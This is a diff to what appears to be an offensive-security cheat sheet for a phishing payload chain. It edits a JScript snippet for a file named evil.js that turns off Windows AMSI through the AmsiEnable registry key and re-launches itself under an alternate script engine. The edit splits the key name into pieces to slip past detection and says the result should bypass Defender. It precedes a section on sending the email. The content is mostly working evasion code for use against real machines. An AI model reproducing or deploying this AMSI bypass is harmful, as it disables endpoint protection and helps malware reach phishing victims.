@@ -164,21 +164,24 @@ public class TestClass
         int size = buf.Length;
 ```
 - when your evil.js is created, open it and slam the following code at the top:
+- Note you may need to obfuscare the AmsiEnable code block through some simple string manipulation like below
 ```js
 var sh = new ActiveXObject('WScript.Shell');
-var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
+var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\A" +"msi"+"Enable";
 
 try{
-	var AmsiEnable = sh.RegRead(key);
-	if(AmsiEnable!=0){
+	var AEnable = sh.RegRead(key);
+	if(AEnable!=0){
 	throw new Error(1, '');
 	}
 }catch(e){
-	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
-	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
-	sh.RegWrite(key, 1, "REG_DWORD"); // put it back
+	sh.RegWrite(key, 0, "REG_DWORD"); 
+	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); 
+	sh.RegWrite(key, 1, "REG_DWORD"); 
 	WScript.Quit(1);
 }
+
+<rest of your dotnet2jscript stuff>
 ```
 - This should bypass a noobish Defender and AMSI
 ### Sending the email!
